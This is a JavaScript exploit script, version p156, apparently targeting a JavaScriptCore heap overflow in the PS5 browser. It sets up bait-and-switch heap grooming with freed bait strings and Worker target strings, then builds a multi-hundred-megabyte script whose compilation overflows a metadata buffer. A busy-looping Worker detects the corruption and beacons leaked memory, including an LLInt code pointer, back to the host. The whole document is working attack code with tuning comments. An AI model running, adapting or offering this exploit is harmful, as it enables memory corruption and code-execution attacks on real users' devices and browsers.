// p156 — Bait-and-switch on Primary/marge heap (based on p146 which WORKED)
//
// WHY p155 FAILED: No bait-and-switch. Metadata buffer landed ABOVE Worker targets.
// WHY p146 WORKED: Baits occupy low marge pages → freed → metadata reuses low slot → BELOW Worker targets.
//
// STRATEGY (proven by p146):
// 1. Main thread allocates 20 bait strings (100K chars → ~100KB StringImpl → marge ~102KB slot)
// 2. Worker allocates 14 target strings (100K chars → same marge slot size, HIGHER addresses)
// 3. Main thread frees all baits + 30 rounds GC pressure → low marge pages freed
// 4. Compile overflow script → metadata buffer gets freed low slot (first-fit)
// 5. Call function → finishCreation writes 4.29GB forward → through Worker targets
// 6. Worker polls with BUSY LOOP (not setTimeout!) → detects corruption → beacons hex data
//
// FIXES over p146:
// - Absolute URLs for Worker XHR (blob origin can't resolve relative on PS5)
// - POST beacons for large hex dumps (URL length limit)
// Beacon prefix: V156-

(function() {
  var BASE = location.protocol + '//' + location.host;
  var B = function(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V156-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  };
  var BP = function(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V156-' + tag + '?t=' + Date.now(), true);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body);
    } catch(e) {}
  };

  B('BOOT');

  // ── WORKER ──
  var workerCode = function() {
    var targets = [];
    var baseUrl = '';
    var STR_LEN = 100000;
    var CANARY = 0x41; // 'A'

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V156-W-' + tag + '?t=' + Date.now(), true);
        x.send();
      } catch(e) {}
    }
    function beaconPost(tag, body) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V156-W-' + tag + '?t=' + Date.now(), true);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send(body);
      } catch(e) {}
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'alloc') {
        var count = e.data.count;
        for (var i = 0; i < count; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) {
            s += 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
          }
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0);
          targets.push(s);
        }
        beacon('TARGETS-' + targets.length);
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'watch') {
        beacon('WATCHING');

        var found = false;
        var iterations = 0;

        // BUSY LOOP — way faster than setTimeout polling
        while (!found) {
          for (var i = 0; i < targets.length; i++) {
            var len = targets[i].length;
            if (len !== STR_LEN) {
              beacon('LEN-' + i + '-' + len);
              found = true;
              break;
            }
            var c8 = targets[i].charCodeAt(8);
            var c24 = targets[i].charCodeAt(24);
            var c56 = targets[i].charCodeAt(56);
            if (c8 !== CANARY || c24 !== CANARY || c56 !== CANARY) {
              found = true;
              break;
            }
          }
          iterations++;
          if (iterations % 500000 === 0) {
            beacon('POLL-' + iterations);
          }
        }

        // Found corruption — scan ALL strings and extract data
        for (var i = 0; i < targets.length; i++) {
          var len = targets[i].length;
          if (len !== STR_LEN) {
            beacon('H-' + i + '-len=' + len);
            // Header corrupt — length field reinterpreted. Try to read if safe.
            if (len > 0 && len < 1000000) {
              var hx = '';
              for (var b = 0; b < Math.min(32, len); b++) {
                try {
                  var v = targets[i].charCodeAt(b);
                  hx += (v < 16 ? '0' : '') + v.toString(16);
                } catch(e) { hx += 'XX'; break; }
              }
              beacon('HD-' + i + '-' + hx);
            }
            continue;
          }
          // Header intact — check for data corruption
          var c8 = targets[i].charCodeAt(8);
          if (c8 === CANARY) {
            var c24 = targets[i].charCodeAt(24);
            var c56 = targets[i].charCodeAt(56);
            if (c24 === CANARY && c56 === CANARY) continue; // clean
          }
          // Data corruption with intact header — extract metadata entry bytes
          var start = -1;
          for (var s = 0; s < 100; s++) {
            if (targets[i].charCodeAt(s) !== CANARY) { start = s; break; }
          }
          if (start < 0) continue;
          beacon('D-' + i + '-off=' + start);

          // Read 112 bytes (full metadata entry)
          var hex = '';
          for (var b = start; b < start + 112 && b < STR_LEN; b++) {
            var v = targets[i].charCodeAt(b);
            hex += (v < 16 ? '0' : '') + v.toString(16);
          }
          // Beacon in chunks
          beacon('E1-' + i + '-' + hex.substring(0, 160));
          if (hex.length > 160) beacon('E2-' + i + '-' + hex.substring(160));

          // m_slowPathCallDestination at entry+24 (8 bytes = LLInt code pointer)
          var ptrOff = start + 24;
          if (ptrOff + 8 <= STR_LEN) {
            var ptr = '';
            for (var p = ptrOff; p < ptrOff + 8; p++) {
              ptr += (targets[i].charCodeAt(p) < 16 ? '0' : '') + targets[i].charCodeAt(p).toString(16);
            }
            beacon('PTR-' + i + '-' + ptr);
          }

          // m_bytecodeIndex at entry+68 (4 bytes)
          var idxOff = start + 68;
          if (idxOff + 4 <= STR_LEN) {
            var idx = '';
            for (var d = idxOff; d < idxOff + 4; d++) {
              idx += (targets[i].charCodeAt(d) < 16 ? '0' : '') + targets[i].charCodeAt(d).toString(16);
            }
            beacon('IDX-' + i + '-' + idx);
          }
        }
        beacon('DONE');
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var workerUrl = URL.createObjectURL(workerBlob);
  var worker = new Worker(workerUrl);
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  // ── PHASE 1: BAIT STRINGS (Primary/marge heap) ──
  // 100,000 chars → ~100,024 byte StringImpl → 102,400 byte marge slot
  // Same size class as metadata buffer!
  var N_BAIT = 20;
  var STR_LEN = 100000;

  B('BAIT-START');
  var baits = [];
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) {
      bait += 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';
    }
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  B('BAIT-DONE-' + N_BAIT);

  // ── PHASE 2: WORKER ALLOCATES TARGETS ──
  // Worker StringImpl goes to same Primary/marge heap, AFTER baits → higher addresses
  worker.onmessage = function(e) {
    if (e.data.ready) {
      phaseFreeBaits();
    }
  };

  B('WORKER-ALLOC');
  worker.postMessage({ cmd: 'alloc', count: 14 });

  // ── PHASE 3: FREE BAITS + GC PRESSURE ──
  function phaseFreeBaits() {
    B('FREE-START');

    for (var i = 0; i < baits.length; i++) {
      baits[i] = null;
    }
    baits = null;

    var gcRound = 0;

    function gcPressureRound() {
      for (var j = 0; j < 1000; j++) {
        new ArrayBuffer(8192);
      }
      for (var j = 0; j < 500; j++) {
        new Array(100).fill(gcRound);
      }
      gcRound++;

      if (gcRound < 30) {
        setTimeout(gcPressureRound, 30);
      } else {
        B('GC-PRESSURE-' + gcRound);
        phaseBuildOverflow();
      }
    }

    gcPressureRound();
  }

  // ── PHASE 4: BUILD OVERFLOW ──
  function phaseBuildOverflow() {
    B('BUILD-START');

    var N_OVERFLOW = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N_OVERFLOW / CHUNK);
    var REM = N_OVERFLOW - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v156fn=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v156ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null;
    remChunk = null;
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMPILED-' + (window.__v156ok ? 'OK' : 'FAIL'));
      if (!window.__v156fn) { B('NO-FN'); return; }

      // ── PHASE 5: START WORKER POLLING, THEN TRIGGER ──
      worker.postMessage({ cmd: 'watch' });

      setTimeout(function() {
        B('CALLING');

        try {
          window.__v156fn(function(){});
        } catch(ex) {
          B('CATCH-' + (ex.message || '').substring(0, 30));
        }

        B('SURVIVED');
      }, 200);
    };

    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
